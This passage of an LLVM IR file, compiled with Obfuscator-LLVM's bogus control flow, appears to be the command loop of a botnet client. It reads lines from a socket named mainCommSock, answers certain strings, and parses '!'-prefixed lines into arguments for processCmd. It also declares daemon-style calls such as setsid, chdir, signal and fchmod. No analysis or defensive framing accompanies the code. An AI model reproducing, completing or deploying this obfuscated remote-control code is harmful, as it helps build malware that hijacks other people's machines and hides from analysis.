  %256 = sub i32 %254, 1
  %257 = mul i32 %254, %256
  %258 = urem i32 %257, 2
  %259 = icmp eq i32 %258, 0
  %260 = icmp slt i32 %255, 10
  %261 = or i1 %259, %260
  br i1 %261, label %originalBBpart247, label %originalBB37alteredBB

originalBBpart247:                                ; preds = %originalBB37
  br label %140

; <label>:262:                                    ; preds = %140
  %263 = load i32, i32* %16, align 4
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i64 0, i64 %264
  store i8 0, i8* %265, align 1
  %266 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  call void @trim(i8* %266)
  %267 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  %268 = call i8* @strstr(i8* %267, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.58, i32 0, i32 0)) #10
  %269 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  %270 = icmp eq i8* %268, %269
  br i1 %270, label %271, label %274

; <label>:271:                                    ; preds = %262
  %272 = load i32, i32* @mainCommSock, align 4
  %273 = call i32 (i32, i8*, ...) @sockprintf(i32 %272, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.82, i32 0, i32 0))
  br label %118

; <label>:274:                                    ; preds = %262
  %275 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  %276 = call i8* @strstr(i8* %275, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.83, i32 0, i32 0)) #10
  %277 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  %278 = icmp eq i8* %276, %277
  br i1 %278, label %279, label %296

; <label>:279:                                    ; preds = %274
  %280 = load i32, i32* @x.79
  %281 = load i32, i32* @y.80
  %282 = sub i32 %280, 1
  %283 = mul i32 %280, %282
  %284 = urem i32 %283, 2
  %285 = icmp eq i32 %284, 0
  %286 = icmp slt i32 %281, 10
  %287 = or i1 %285, %286
  br i1 %287, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %279
  call void @exit(i32 0) #14
  %288 = load i32, i32* @x.79
  %289 = load i32, i32* @y.80
  %290 = sub i32 %288, 1
  %291 = mul i32 %288, %290
  %292 = urem i32 %291, 2
  %293 = icmp eq i32 %292, 0
  %294 = icmp slt i32 %289, 10
  %295 = or i1 %293, %294
  br i1 %295, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  unreachable

; <label>:296:                                    ; preds = %274
  %297 = load i32, i32* @x.79
  %298 = load i32, i32* @y.80
  %299 = sub i32 %297, 1
  %300 = mul i32 %297, %299
  %301 = urem i32 %300, 2
  %302 = icmp eq i32 %301, 0
  %303 = icmp slt i32 %298, 10
  %304 = or i1 %302, %303
  br i1 %304, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %296
  %305 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  store i8* %305, i8** %20, align 8
  %306 = load i8*, i8** %20, align 8
  %307 = load i8, i8* %306, align 1
  %308 = zext i8 %307 to i32
  %309 = icmp eq i32 %308, 33
  %310 = load i32, i32* @x.79
  %311 = load i32, i32* @y.80
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br i1 %309, label %318, label %598

; <label>:318:                                    ; preds = %originalBBpart255
  %319 = load i32, i32* @x.79
  %320 = load i32, i32* @y.80
  %321 = sub i32 %319, 1
  %322 = mul i32 %319, %321
  %323 = urem i32 %322, 2
  %324 = icmp eq i32 %323, 0
  %325 = icmp slt i32 %320, 10
  %326 = or i1 %324, %325
  br i1 %326, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %318
  %327 = load i8*, i8** %20, align 8
  %328 = getelementptr inbounds i8, i8* %327, i64 1
  store i8* %328, i8** %21, align 8
  %329 = load i32, i32* @x.79
  %330 = load i32, i32* @y.80
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br label %337

; <label>:337:                                    ; preds = %365, %originalBBpart259
  %338 = load i8*, i8** %21, align 8
  %339 = load i8, i8* %338, align 1
  %340 = zext i8 %339 to i32
  %341 = icmp ne i32 %340, 32
  br i1 %341, label %342, label %363

; <label>:342:                                    ; preds = %337
  %343 = load i32, i32* @x.79
  %344 = load i32, i32* @y.80
  %345 = sub i32 %343, 1
  %346 = mul i32 %343, %345
  %347 = urem i32 %346, 2
  %348 = icmp eq i32 %347, 0
  %349 = icmp slt i32 %344, 10
  %350 = or i1 %348, %349
  br i1 %350, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %342
  %351 = load i8*, i8** %21, align 8
  %352 = load i8, i8* %351, align 1
  %353 = zext i8 %352 to i32
  %354 = icmp ne i32 %353, 0
  %355 = load i32, i32* @x.79
  %356 = load i32, i32* @y.80
  %357 = sub i32 %355, 1
  %358 = mul i32 %355, %357
  %359 = urem i32 %358, 2
  %360 = icmp eq i32 %359, 0
  %361 = icmp slt i32 %356, 10
  %362 = or i1 %360, %361
  br i1 %362, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br label %363

; <label>:363:                                    ; preds = %originalBBpart263, %337
  %364 = phi i1 [ false, %337 ], [ %354, %originalBBpart263 ]
  br i1 %364, label %365, label %368

; <label>:365:                                    ; preds = %363
  %366 = load i8*, i8** %21, align 8
  %367 = getelementptr inbounds i8, i8* %366, i32 1
  store i8* %367, i8** %21, align 8
  br label %337

; <label>:368:                                    ; preds = %363
  %369 = load i32, i32* @x.79
  %370 = load i32, i32* @y.80
  %371 = sub i32 %369, 1
  %372 = mul i32 %369, %371
  %373 = urem i32 %372, 2
  %374 = icmp eq i32 %373, 0
  %375 = icmp slt i32 %370, 10
  %376 = or i1 %374, %375
  br i1 %376, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %368
  %377 = load i8*, i8** %21, align 8
  %378 = load i8, i8* %377, align 1
  %379 = zext i8 %378 to i32
  %380 = icmp eq i32 %379, 0
  %381 = load i32, i32* @x.79
  %382 = load i32, i32* @y.80
  %383 = sub i32 %381, 1
  %384 = mul i32 %381, %383
  %385 = urem i32 %384, 2
  %386 = icmp eq i32 %385, 0
  %387 = icmp slt i32 %382, 10
  %388 = or i1 %386, %387
  br i1 %388, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br i1 %380, label %389, label %390

; <label>:389:                                    ; preds = %originalBBpart267
  br label %118

; <label>:390:                                    ; preds = %originalBBpart267
  %391 = load i8*, i8** %21, align 8
  store i8 0, i8* %391, align 1
  %392 = load i8*, i8** %20, align 8
  %393 = getelementptr inbounds i8, i8* %392, i64 1
  store i8* %393, i8** %21, align 8
  %394 = load i8*, i8** %20, align 8
  %395 = load i8*, i8** %21, align 8
  %396 = call i64 @strlen(i8* %395) #10
  %397 = getelementptr inbounds i8, i8* %394, i64 %396
  %398 = getelementptr inbounds i8, i8* %397, i64 2
  store i8* %398, i8** %20, align 8
  br label %399

; <label>:399:                                    ; preds = %435, %390
  %400 = load i8*, i8** %20, align 8
  %401 = load i8*, i8** %20, align 8
  %402 = call i64 @strlen(i8* %401) #10
  %403 = sub i64 %402, 1
  %404 = getelementptr inbounds i8, i8* %400, i64 %403
  %405 = load i8, i8* %404, align 1
  %406 = zext i8 %405 to i32
  %407 = icmp eq i32 %406, 10
  br i1 %407, label %433, label %408

; <label>:408:                                    ; preds = %399
  %409 = load i32, i32* @x.79
  %410 = load i32, i32* @y.80
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %408
  %417 = load i8*, i8** %20, align 8
  %418 = load i8*, i8** %20, align 8
  %419 = call i64 @strlen(i8* %418) #10
  %420 = sub i64 %419, 1
  %421 = getelementptr inbounds i8, i8* %417, i64 %420
  %422 = load i8, i8* %421, align 1
  %423 = zext i8 %422 to i32
  %424 = icmp eq i32 %423, 13
  %425 = load i32, i32* @x.79
  %426 = load i32, i32* @y.80
  %427 = sub i32 %425, 1
  %428 = mul i32 %425, %427
  %429 = urem i32 %428, 2
  %430 = icmp eq i32 %429, 0
  %431 = icmp slt i32 %426, 10
  %432 = or i1 %430, %431
  br i1 %432, label %originalBBpart280, label %originalBB69alteredBB

originalBBpart280:                                ; preds = %originalBB69
  br label %433

; <label>:433:                                    ; preds = %originalBBpart280, %399
  %434 = phi i1 [ true, %399 ], [ %424, %originalBBpart280 ]
  br i1 %434, label %435, label %441

; <label>:435:                                    ; preds = %433
  %436 = load i8*, i8** %20, align 8
  %437 = load i8*, i8** %20, align 8
  %438 = call i64 @strlen(i8* %437) #10
  %439 = sub i64 %438, 1
  %440 = getelementptr inbounds i8, i8* %436, i64 %439
  store i8 0, i8* %440, align 1
  br label %399

; <label>:441:                                    ; preds = %433
  %442 = load i8*, i8** %20, align 8
  store i8* %442, i8** %22, align 8
  br label %443

; <label>:443:                                    ; preds = %471, %441
  %444 = load i8*, i8** %20, align 8
  %445 = load i8, i8* %444, align 1
  %446 = zext i8 %445 to i32
  %447 = icmp ne i32 %446, 32
  br i1 %447, label %448, label %453

; <label>:448:                                    ; preds = %443
  %449 = load i8*, i8** %20, align 8
  %450 = load i8, i8* %449, align 1
  %451 = zext i8 %450 to i32
  %452 = icmp ne i32 %451, 0
  br label %453

; <label>:453:                                    ; preds = %448, %443
  %454 = phi i1 [ false, %443 ], [ %452, %448 ]
  %455 = load i32, i32* @x.79
  %456 = load i32, i32* @y.80
  %457 = sub i32 %455, 1
  %458 = mul i32 %455, %457
  %459 = urem i32 %458, 2
  %460 = icmp eq i32 %459, 0
  %461 = icmp slt i32 %456, 10
  %462 = or i1 %460, %461
  br i1 %462, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %453
  %463 = load i32, i32* @x.79
  %464 = load i32, i32* @y.80
  %465 = sub i32 %463, 1
  %466 = mul i32 %463, %465
  %467 = urem i32 %466, 2
  %468 = icmp eq i32 %467, 0
  %469 = icmp slt i32 %464, 10
  %470 = or i1 %468, %469
  br i1 %470, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %454, label %471, label %474

; <label>:471:                                    ; preds = %originalBBpart284
  %472 = load i8*, i8** %20, align 8
  %473 = getelementptr inbounds i8, i8* %472, i32 1
  store i8* %473, i8** %20, align 8
  br label %443

; <label>:474:                                    ; preds = %originalBBpart284
  %475 = load i32, i32* @x.79
  %476 = load i32, i32* @y.80
  %477 = sub i32 %475, 1
  %478 = mul i32 %475, %477
  %479 = urem i32 %478, 2
  %480 = icmp eq i32 %479, 0
  %481 = icmp slt i32 %476, 10
  %482 = or i1 %480, %481
  br i1 %482, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %474
  %483 = load i8*, i8** %20, align 8
  store i8 0, i8* %483, align 1
  %484 = load i8*, i8** %20, align 8
  %485 = getelementptr inbounds i8, i8* %484, i32 1
  store i8* %485, i8** %20, align 8
  %486 = load i8*, i8** %22, align 8
  store i8* %486, i8** %23, align 8
  %487 = load i32, i32* @x.79
  %488 = load i32, i32* @y.80
  %489 = sub i32 %487, 1
  %490 = mul i32 %487, %489
  %491 = urem i32 %490, 2
  %492 = icmp eq i32 %491, 0
  %493 = icmp slt i32 %488, 10
  %494 = or i1 %492, %493
  br i1 %494, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br label %495

; <label>:495:                                    ; preds = %499, %originalBBpart288
  %496 = load i8*, i8** %23, align 8
  %497 = load i8, i8* %496, align 1
  %498 = icmp ne i8 %497, 0
  br i1 %498, label %499, label %508

; <label>:499:                                    ; preds = %495
  %500 = load i8*, i8** %23, align 8
  %501 = load i8, i8* %500, align 1
  %502 = zext i8 %501 to i32
  %503 = call i32 @toupper(i32 %502) #10
  %504 = trunc i32 %503 to i8
  %505 = load i8*, i8** %23, align 8
  store i8 %504, i8* %505, align 1
  %506 = load i8*, i8** %23, align 8
  %507 = getelementptr inbounds i8, i8* %506, i32 1
  store i8* %507, i8** %23, align 8
  br label %495

; <label>:508:                                    ; preds = %495
  store i32 1, i32* %25, align 4
  %509 = load i8*, i8** %20, align 8
  %510 = call i8* @strtok(i8* %509, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %510, i8** %26, align 8
  %511 = load i8*, i8** %22, align 8
  %512 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 0
  store i8* %511, i8** %512, align 16
  br label %513

; <label>:513:                                    ; preds = %544, %508
  %514 = load i8*, i8** %26, align 8
  %515 = icmp ne i8* %514, null
  br i1 %515, label %516, label %546

; <label>:516:                                    ; preds = %513
  %517 = load i8*, i8** %26, align 8
  %518 = load i8, i8* %517, align 1
  %519 = zext i8 %518 to i32
  %520 = icmp ne i32 %519, 10
  br i1 %520, label %521, label %544

; <label>:521:                                    ; preds = %516
  %522 = load i8*, i8** %26, align 8
  %523 = call i64 @strlen(i8* %522) #10
  %524 = add i64 %523, 1
  %525 = call noalias i8* @malloc(i64 %524) #2
  %526 = load i32, i32* %25, align 4
  %527 = sext i32 %526 to i64
  %528 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 %527
  store i8* %525, i8** %528, align 8
  %529 = load i32, i32* %25, align 4
  %530 = sext i32 %529 to i64
  %531 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 %530
  %532 = load i8*, i8** %531, align 8
  %533 = load i8*, i8** %26, align 8
  %534 = call i64 @strlen(i8* %533) #10
  %535 = add i64 %534, 1
  call void @llvm.memset.p0i8.i64(i8* %532, i8 0, i64 %535, i32 1, i1 false)
  %536 = load i32, i32* %25, align 4
  %537 = sext i32 %536 to i64
  %538 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 %537
  %539 = load i8*, i8** %538, align 8
  %540 = load i8*, i8** %26, align 8
  %541 = call i8* @strcpy(i8* %539, i8* %540) #2
  %542 = load i32, i32* %25, align 4
  %543 = add nsw i32 %542, 1
  store i32 %543, i32* %25, align 4
  br label %544

; <label>:544:                                    ; preds = %521, %516
  %545 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %545, i8** %26, align 8
  br label %513

; <label>:546:                                    ; preds = %513
  %547 = load i32, i32* %25, align 4
  %548 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i32 0, i32 0
  call void @processCmd(i32 %547, i8** %548)
  %549 = load i32, i32* %25, align 4
  %550 = icmp sgt i32 %549, 1
  br i1 %550, label %551, label %581

; <label>:551:                                    ; preds = %546
  %552 = load i32, i32* @x.79
  %553 = load i32, i32* @y.80
  %554 = sub i32 %552, 1
  %555 = mul i32 %552, %554
  %556 = urem i32 %555, 2
  %557 = icmp eq i32 %556, 0
  %558 = icmp slt i32 %553, 10
  %559 = or i1 %557, %558
  br i1 %559, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %551
  store i32 1, i32* %27, align 4
  store i32 1, i32* %27, align 4
  %560 = load i32, i32* @x.79
  %561 = load i32, i32* @y.80
  %562 = sub i32 %560, 1
  %563 = mul i32 %560, %562
  %564 = urem i32 %563, 2
  %565 = icmp eq i32 %564, 0
  %566 = icmp slt i32 %561, 10
  %567 = or i1 %565, %566
  br i1 %567, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br label %568

; <label>:568:                                    ; preds = %577, %originalBBpart292
  %569 = load i32, i32* %27, align 4
  %570 = load i32, i32* %25, align 4
  %571 = icmp slt i32 %569, %570
  br i1 %571, label %572, label %580

; <label>:572:                                    ; preds = %568
  %573 = load i32, i32* %27, align 4
  %574 = sext i32 %573 to i64
  %575 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 %574
  %576 = load i8*, i8** %575, align 8
  call void @free(i8* %576) #2
  br label %577

; <label>:577:                                    ; preds = %572
  %578 = load i32, i32* %27, align 4
  %579 = add nsw i32 %578, 1
  store i32 %579, i32* %27, align 4
  br label %568

; <label>:580:                                    ; preds = %568
  br label %581

; <label>:581:                                    ; preds = %580, %546
  %582 = load i32, i32* @x.79
  %583 = load i32, i32* @y.80
  %584 = sub i32 %582, 1
  %585 = mul i32 %582, %584
  %586 = urem i32 %585, 2
  %587 = icmp eq i32 %586, 0
  %588 = icmp slt i32 %583, 10
  %589 = or i1 %587, %588
  br i1 %589, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %581
  %590 = load i32, i32* @x.79
  %591 = load i32, i32* @y.80
  %592 = sub i32 %590, 1
  %593 = mul i32 %590, %592
  %594 = urem i32 %593, 2
  %595 = icmp eq i32 %594, 0
  %596 = icmp slt i32 %591, 10
  %597 = or i1 %595, %596
  br i1 %597, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %598

; <label>:598:                                    ; preds = %originalBBpart296, %originalBBpart255
  %599 = load i32, i32* @x.79
  %600 = load i32, i32* @y.80
  %601 = sub i32 %599, 1
  %602 = mul i32 %599, %601
  %603 = urem i32 %602, 2
  %604 = icmp eq i32 %603, 0
  %605 = icmp slt i32 %600, 10
  %606 = or i1 %604, %605
  br i1 %606, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %598
  %607 = load i32, i32* @x.79
  %608 = load i32, i32* @y.80
  %609 = sub i32 %607, 1
  %610 = mul i32 %607, %609
  %611 = urem i32 %610, 2
  %612 = icmp eq i32 %611, 0
  %613 = icmp slt i32 %608, 10
  %614 = or i1 %612, %613
  br i1 %614, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br label %118

; <label>:615:                                    ; preds = %118
  %616 = load i32, i32* @x.79
  %617 = load i32, i32* @y.80
  %618 = sub i32 %616, 1
  %619 = mul i32 %616, %618
  %620 = urem i32 %619, 2
  %621 = icmp eq i32 %620, 0
  %622 = icmp slt i32 %617, 10
  %623 = or i1 %621, %622
  br i1 %623, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %615
  %624 = load i32, i32* @x.79
  %625 = load i32, i32* @y.80
  %626 = sub i32 %624, 1
  %627 = mul i32 %624, %626
  %628 = urem i32 %627, 2
  %629 = icmp eq i32 %628, 0
  %630 = icmp slt i32 %625, 10
  %631 = or i1 %629, %630
  br i1 %631, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br label %112
                                                  ; No predecessors!
  %633 = load i32, i32* %3, align 4
  ret i32 %633

originalBBalteredBB:                              ; preds = %originalBB, %55
  %634 = load i32, i32* %12, align 4
  %635 = call i32 @waitpid(i32 %634, i32* %14, i32 0)
  call void @exit(i32 0) #14
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %88
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %123
  store i32 0, i32* %17, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %153
  %636 = load i32, i32* %17, align 4
  %_ = sub i32 0, %636
  %gen = add i32 %_, 1
  %_11 = sub i32 %636, 1
  %gen12 = mul i32 %_11, 1
  %_13 = sub i32 %636, 1
  %gen14 = mul i32 %_13, 1
  %_15 = shl i32 %636, 1
  %_16 = shl i32 %636, 1
  %637 = add nsw i32 %636, 1
  store i32 %637, i32* %19, align 4
  br label %originalBB10

originalBB20alteredBB:                            ; preds = %originalBB20, %219
  %638 = load i32, i32* %19, align 4
  %_21 = shl i32 %638, 1
  %_22 = sub i32 0, %638
  %gen23 = add i32 %_22, 1
  %_24 = sub i32 %638, 1
  %gen25 = mul i32 %_24, 1
  %_26 = sub i32 %638, 1
  %gen27 = mul i32 %_26, 1
  %_28 = sub i32 %638, 1
  %gen29 = mul i32 %_28, 1
  %_30 = sub i32 0, %638
  %gen31 = add i32 %_30, 1
  %_32 = sub i32 0, %638
  %gen33 = add i32 %_32, 1
  %639 = add i32 %638, 1
  store i32 %639, i32* %19, align 4
  br label %originalBB20

originalBB37alteredBB:                            ; preds = %originalBB37, %243
  %640 = load i32, i32* %17, align 4
  %_38 = shl i32 %640, 1
  %_39 = sub i32 0, %640
  %gen40 = add i32 %_39, 1
  %_41 = sub i32 %640, 1
  %gen42 = mul i32 %_41, 1
  %_43 = shl i32 %640, 1
  %_44 = sub i32 %640, 1
  %gen45 = mul i32 %_44, 1
  %641 = add nsw i32 %640, 1
  store i32 %641, i32* %17, align 4
  br label %originalBB37

originalBB49alteredBB:                            ; preds = %originalBB49, %279
  call void @exit(i32 0) #14
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %296
  %642 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  store i8* %642, i8** %20, align 8
  %643 = load i8*, i8** %20, align 8
  %644 = load i8, i8* %643, align 1
  %645 = zext i8 %644 to i32
  %646 = icmp eq i32 %645, 33
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %318
  %647 = load i8*, i8** %20, align 8
  %648 = getelementptr inbounds i8, i8* %647, i64 1
  store i8* %648, i8** %21, align 8
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %342
  %649 = load i8*, i8** %21, align 8
  %650 = load i8, i8* %649, align 1
  %651 = zext i8 %650 to i32
  %652 = icmp ne i32 %651, 0
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %368
  %653 = load i8*, i8** %21, align 8
  %654 = load i8, i8* %653, align 1
  %655 = zext i8 %654 to i32
  %656 = icmp eq i32 %655, 0
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %408
  %657 = load i8*, i8** %20, align 8
  %658 = load i8*, i8** %20, align 8
  %659 = call i64 @strlen(i8* %658) #10
  %_70 = sub i64 0, %659
  %gen71 = add i64 %_70, 1
  %_72 = sub i64 0, %659
  %gen73 = add i64 %_72, 1
  %_74 = sub i64 %659, 1
  %gen75 = mul i64 %_74, 1
  %_76 = shl i64 %659, 1
  %_77 = sub i64 %659, 1
  %gen78 = mul i64 %_77, 1
  %660 = sub i64 %659, 1
  %661 = getelementptr inbounds i8, i8* %657, i64 %660
  %662 = load i8, i8* %661, align 1
  %663 = zext i8 %662 to i32
  %664 = icmp eq i32 %663, 13
  br label %originalBB69

originalBB82alteredBB:                            ; preds = %originalBB82, %453
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %474
  %665 = load i8*, i8** %20, align 8
  store i8 0, i8* %665, align 1
  %666 = load i8*, i8** %20, align 8
  %667 = getelementptr inbounds i8, i8* %666, i32 1
  store i8* %667, i8** %20, align 8
  %668 = load i8*, i8** %22, align 8
  store i8* %668, i8** %23, align 8
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %551
  store i32 1, i32* %27, align 4
  store i32 1, i32* %27, align 4
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %581
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %598
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %615
  br label %originalBB102
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

declare i64 @fwrite(i8*, i64, i64, %struct._IO_FILE*) #3

; Function Attrs: nounwind
declare i32 @fileno(%struct._IO_FILE*) #4

declare i32 @fchmod(...) #3

declare i32 @fclose(%struct._IO_FILE*) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

declare i32 @sleep(i32) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146623954}
!2 = !{i32 -2146623263}
!3 = !{i32 -2146622514}
!4 = !{i32 -2146621691}
!5 = !{i32 -2146620881}
!6 = !{i32 -2146619630}
